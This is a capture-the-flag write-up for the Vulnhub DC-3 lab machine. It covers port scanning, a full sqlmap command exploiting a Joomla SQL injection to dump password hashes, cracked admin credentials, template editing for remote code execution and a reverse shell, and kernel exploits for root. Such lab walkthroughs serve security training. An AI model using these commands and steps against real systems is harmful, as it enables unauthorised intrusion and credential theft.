# Vulnhub-DC 3

## Rustscan
```bash

rustscan -a 192.168.1.10 -- -A -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.           
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |                  
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |                  
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'                                                                                            
The Modern Day Port Scanner.                                              
________________________________________                                                                                                            
: https://discord.gg/GFrQsGy           :                                                                                                            
: https://github.com/RustScan/RustScan :                                                                                                            
 --------------------------------------                                                                                                             
Open 192.168.1.10:80                                                   

PORT   STATE SERVICE REASON         VERSION                               
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA          
|_http-generator: Joomla! - Open Source Content Management
| http-methods:      
|_  Supported Methods: GET HEAD POST OPTIONS                              
|_http-server-header: Apache/2.4.18 (Ubuntu)                              
|_http-title: Home                                                        
MAC Address: 08:00:27:99:17:ED (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                               
Device type: general purpose                                              
Running: Linux 3.X|4.X                                         
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4                                             
```

## PORT 80 (HTTP)

<img src="https://imgur.com/Hapy2k4.png"/>

This is a joomla CMS , which can be identified if you have wappalyzer extension installed

So I ran diresarch but found nothing interesting

<img src="https://imgur.com/YFgXm3P.png"/>

I went to google for any exploits available for joomla and found one metasploit module

<img src="https://imgur.com/fdzAg6d.png"/>

<img src="https://imgur.com/HtUYNQP.png"/>

But this exploit didn't work

<img src="https://imgur.com/J50H507.png"/>

So searched again to find any exploits and came across sql injection for joomla

<img src="https://imgur.com/SQog8bV.png"/>

<img src="https://imgur.com/vUIXuid.png"/>

After sometime it came back with databases

<img src="https://imgur.com/SR1Stk2.png"/>

Now let's select `joomladb` database and see it's tables

<img src="https://imgur.com/BkNfAS3.png"/>

It will start to retrieve the tables from the database

<img src="https://imgur.com/s8J4HNL.png"/>

Now we are interested in `users` table

<img src="https://imgur.com/RupveiZ.png"/>

I tried to enumerate for columns in table but couldn't

<img src="https://imgur.com/DKQg78Q.png"/>

<img src="https://imgur.com/GufIaZn.png"/>

Then went with guessing the column name to be `name` and it returned an entry in the table so the next column could be password

<img src="https://imgur.com/StqdYa0.png"/>

```bash
sqlmap -u "http://192.168.1.10/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=
updatexml" --risk=3 --level=5 --random-agent --dbs -p 'list[fullordering]' -D 'joomladb' --tables -T '#__users' --columns -C name,password --dump --
batch
```

<img src="https://imgur.com/pyMvpna.png"/>

The hash looks like bcrypt so let's try cracking it with `john`

<img src="https://imgur.com/h9KexPf.png"/>

We can now login to joomla with `admin:snoopy`

<img src="https://imgur.com/h6BQaPV.png"/>

<img src="https://imgur.com/EvjnDus.png"/>

To get a reverse shell , go to  `Extensions` ->  `Templates`

<img src="https://i.imgur.com/bUfOKbm.png"/>

And edit the `error.php` file

<img src="https://i.imgur.com/5dZOiRe.png"/>

<img src="https://imgur.com/IN4pYCY.png"/>

Now you just need to to navigate to that file , `/templates/beez3/error.php`

But this didn't work let's try to add a simple command injection paramter

<img src="https://imgur.com/8SH0P9f.png"/>

<img src="https://imgur.com/Co3r6O7.png"/>

<img src="https://imgur.com/EKsnnm9.png"/>

Now we have a rce ,just need to get a reverse shell

<img src="https://imgur.com/dbaqemR.png"/>

We have a shell great ! , so now let's run linpeas

<img src="https://imgur.com/RF945CW.png"/>

Right off the bat it shows that it's using an old linux kernel so there is an exploit available

<img src="https://imgur.com/I32glok.png"/>

<img src="https://imgur.com/RF945CW.png"/>

Download and transfer the exploit to traget machine make sure to covert it to unix format using `dos2unix`

<img src="https://imgur.com/ICvKRJM.png"/>

After compiling and running ,it didn't worked

<img src="https://imgur.com/VJQztaz.png"/>

I searched again for an exploit and found one 

<img src="https://i.imgur.com/vDYOiBJ.png"/>

<img src="https://imgur.com/Oelt3iT.png"/>

After running it crashed : |

<img src="https://imgur.com/FznhS1t.png"/>

Then found another exploit 

<img src="https://imgur.com/viESMC3.png"/>

<img src="https://imgur.com/F6avcw6.png"/>

<img src="https://imgur.com/hIRnf9T.png"/>

<img src="https://imgur.com/ADVGVhd.png"/>

We need to just run `compile.sh` after that run the binary `doubleput`

<img src="https://imgur.com/KGeCjEz.png"/>

<img src="https://imgur.com/kia2dqb.png"/>